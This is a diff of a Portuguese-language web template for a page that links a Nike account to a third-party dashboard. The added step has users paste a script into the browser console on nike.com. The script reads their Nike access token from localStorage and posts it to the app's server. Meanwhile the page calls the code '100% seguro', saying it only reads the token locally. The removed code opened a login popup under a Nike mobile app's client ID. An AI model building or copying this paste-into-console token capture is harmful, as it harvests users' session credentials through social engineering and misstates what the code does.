@@ -56,31 +56,65 @@
                             </p>
                         </div>
 
-                        <!-- Passo 2: Botão Mágico -->
+                        <!-- Passo 2: Código Automático -->
                         <div id="step2" class="step mb-4">
-                            <h5><span class="badge bg-warning">2</span> Clique no Botão Mágico</h5>
-                            <p>Após fazer login, clique no botão mágico abaixo:</p>
-                            <div class="text-center my-4">
-                                <button class="btn btn-magic" id="btnMagic" onclick="capturarTokenNike()">
-                                    ✨ CONECTAR NIKE AUTOMATICAMENTE ✨
-                                </button>
+                            <h5><span class="badge bg-warning">2</span> Execute o Código Automático</h5>
+                            <p>Após fazer login no Nike, <strong>cole e execute este código no Console</strong>:</p>
+                            
+                            <div class="alert alert-info">
+                                <p class="mb-2"><strong>Como abrir o Console:</strong></p>
+                                <ul class="small mb-2">
+                                    <li>Windows/Linux: Pressione <kbd>F12</kbd> ou <kbd>Ctrl+Shift+J</kbd></li>
+                                    <li>Mac: Pressione <kbd>Cmd+Option+J</kbd></li>
+                                </ul>
+                                <p class="mb-0 small">⚠️ Cole o código abaixo e pressione <kbd>Enter</kbd></p>
                             </div>
-                            <p class="text-muted small">
-                                <i class="bi bi-shield-check"></i> Seguro: apenas lê suas credenciais, nada é compartilhado
+                            
+                            <div class="token-preview mb-3" id="codigoAutomatico" style="cursor: pointer; position: relative;">
+<span style="color: #888;">// Código de captura automática do token Nike</span>
+(function() {
+  const token = localStorage.getItem('access_token');
+  if (!token) { alert('❌ Faça login no Nike primeiro!'); return; }
+  
+  fetch('{{ request.url_root }}nike/callback', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({token: token})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (d.success) {
+      alert('✅ Nike conectado com sucesso! Pode fechar essa aba.');
+      window.close();
+    } else {
+      alert('❌ Erro: ' + (d.error || 'Desconhecido'));
+    }
+  })
+  .catch(e => alert('❌ Erro: ' + e));
+})();
+                            </div>
+                            
+                            <button class="btn btn-primary btn-lg w-100" onclick="copiarCodigo()">
+                                <i class="bi bi-clipboard"></i> COPIAR CÓDIGO
+                            </button>
+                            
+                            <p class="text-muted small mt-2 text-center">
+                                <i class="bi bi-shield-check"></i> 100% seguro - o código apenas lê o token local
                             </p>
                         </div>
 
                         <!-- Passo 3: Sucesso -->
                         <div id="step3" class="step d-none mb-4">
-                            <h5><span class="badge bg-success">3</span> Nike Conectado!</h5>
-                            <div class="alert alert-success">
-                                <h6><i class="bi bi-check-circle-fill"></i> Sucesso!</h6>
-                                <p class="mb-0">Seu token Nike foi capturado e salvo com sucesso!</p>
+                            <h5><span class="badge bg-info">3</span> Aguardando Conexão...</h5>
+                            <div class="alert alert-info">
+                                <div class="d-flex align-items-center">
+                                    <div class="spinner-border spinner-border-sm me-2" role="status"></div>
+                                    <div>
+                                        <h6 class="mb-1">Monitorando conexão...</h6>
+                                        <small>Execute o código no Console do Nike para completar</small>
+                                    </div>
+                                </div>
                             </div>
-                            <div id="tokenPreview" class="token-preview mb-3"></div>
-                            <a href="{{ url_for('dashboard') }}" class="btn btn-success btn-lg w-100">
-                                <i class="bi bi-arrow-right-circle"></i> Ir para Dashboard
-                            </a>
                         </div>
 
                         <!-- Loading -->
@@ -114,100 +148,41 @@
         let nikeWindow = null;
 
         document.getElementById('btnOpenNike').addEventListener('click', function() {
+            // Abre Nike.com em nova aba
+            nikeWindow = window.open('https://www.nike.com/member/settings', '_blank');
+            
             // Ativa próximo passo
             setTimeout(() => {
                 document.getElementById('step2').classList.add('active');
             }, 1000);
         });
 
-        async function capturarTokenNike() {
-            try {
-                document.getElementById('loading').classList.remove('d-none');
-                document.getElementById('error').classList.add('d-none');
+        function copiarCodigo() {
+            const codigo = document.getElementById('codigoAutomatico').textContent;
+            
+            navigator.clipboard.writeText(codigo).then(() => {
+                // Feedback visual
+                const btn = event.target;
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="bi bi-check-circle-fill"></i> CÓDIGO COPIADO! Cole no Console do Nike';
+                btn.classList.add('btn-success');
+                btn.classList.remove('btn-primary');
                 
-                // Abre popup Nike para login OAuth
-                const width = 600;
-                const height = 700;
-                const left = (screen.width / 2) - (width / 2);
-                const top = (screen.height / 2) - (height / 2);
-                
-                nikeWindow = window.open(
-                    'https://unite.nike.com/login?appVersion=650&experienceVersion=650&uxid=com.nike.sport.running.droid.3.8&locale=en_US&backendEnvironment=identity&browser=false&mobile=true&native=true&clientId=WLlnKsP5f5Q9Xv6KwHuf7vQEieGWRJ3d&redirect_uri=https://www.nike.com&response_type=token&scope=openid%20profile%20email%20phone%20flow%20country',
-                    'Nike Login',
-                    `width=${width},height=${height},left=${left},top=${top},scrollbars=yes`
-                );
-
-                // Monitora URL da janela para capturar token
-                const interval = setInterval(() => {
-                    try {
-                        if (nikeWindow.closed) {
-                            clearInterval(interval);
-                            document.getElementById('loading').classList.add('d-none');
-                            mostrarErro('Janela fechada antes de completar o login');
-                            return;
-                        }
-
-                        const url = nikeWindow.location.href;
-                        
-                        // Verifica se há access_token na URL
-                        if (url.includes('access_token=')) {
-                            const params = new URLSearchParams(url.split('#')[1] || url.split('?')[1]);
-                            const token = params.get('access_token');
-                            
-                            if (token) {
-                                clearInterval(interval);
-                                nikeWindow.close();
-                                enviarToken(token);
-                            }
-                        }
-                    } catch (e) {
-                        // Cross-origin error é esperado até o redirecionamento
-                    }
-                }, 500);
-
-                // Timeout após 5 minutos
+                // Ativa passo 3
                 setTimeout(() => {
-                    if (nikeWindow && !nikeWindow.closed) {
-                        clearInterval(interval);
-                        nikeWindow.close();
-                        document.getElementById('loading').classList.add('d-none');
-                        mostrarErro('Timeout: login não completado em 5 minutos');
-                    }
-                }, 300000);
-
-            } catch (error) {
-                document.getElementById('loading').classList.add('d-none');
-                mostrarErro('Erro ao abrir janela de login: ' + error.message);
-            }
-        }
-
-        async function enviarToken(token) {
-            try {
-                const response = await fetch('/nike/callback', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ token: token })
-                });
-
-                const result = await response.json();
-
-                document.getElementById('loading').classList.add('d-none');
-
-                if (response.ok && result.success) {
-                    // Sucesso!
-                    document.getElementById('step2').classList.remove('active');
                     document.getElementById('step3').classList.remove('d-none');
                     document.getElementById('step3').classList.add('active');
-                    document.getElementById('tokenPreview').textContent = `Token: ${token.substring(0, 50)}...`;
-                } else {
-                    mostrarErro(result.error || 'Erro ao salvar token');
-                }
-            } catch (error) {
-                document.getElementById('loading').classList.add('d-none');
-                mostrarErro('Erro ao enviar token: ' + error.message);
-            }
+                }, 500);
+                
+                // Restaura botão após 10 segundos
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.classList.remove('btn-success');
+                    btn.classList.add('btn-primary');
+                }, 10000);
+            }).catch(err => {
+                alert('Erro ao copiar código. Por favor, copie manualmente.');
+            });
         }
 
         function mostrarErro(mensagem) {
@@ -215,6 +190,27 @@
             errorDiv.textContent = mensagem;
             errorDiv.classList.remove('d-none');
         }
+        
+        // Monitora callback bem-sucedido via polling
+        setInterval(() => {
+            fetch('/api/stats')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.has_nike_token) {
+                        // Token foi salvo com sucesso!
+                        document.getElementById('step3').innerHTML = `
+                            <div class="alert alert-success">
+                                <h6><i class="bi bi-check-circle-fill"></i> Nike Conectado!</h6>
+                                <p class="mb-0">Seu token foi salvo com sucesso. Redirecionando...</p>
+                            </div>
+                        `;
+                        setTimeout(() => {
+                            window.location.href = '{{ url_for("dashboard") }}';
+                        }, 2000);
+                    }
+                })
+                .catch(() => {});
+        }, 3000);
     </script>
 </body>
 </html>
